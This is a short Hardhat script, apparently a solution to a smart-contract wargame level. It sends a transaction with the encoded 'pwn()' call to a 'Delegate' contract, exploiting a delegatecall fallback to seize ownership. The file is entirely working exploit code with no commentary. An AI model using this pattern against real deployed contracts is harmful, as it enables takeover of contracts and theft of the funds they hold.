const { ethers } = require("hardhat");
const Runner = require("./lib/runner");

Runner.run(async (provider, owner) => {
  const delegateAddr = "0xD460eD4c83a9885F231A89080a76e3fe87c1d9fC";

  const delegateContract = await ethers.getContractAt("Delegate", delegateAddr);

  const iface = new ethers.utils.Interface(["function pwn()"]);
  const data = iface.encodeFunctionData("pwn");

  const tx = await owner.sendTransaction({
    to: delegateContract.address,
    data,
    gasLimit: 100000,
  });
  await tx.wait();
});
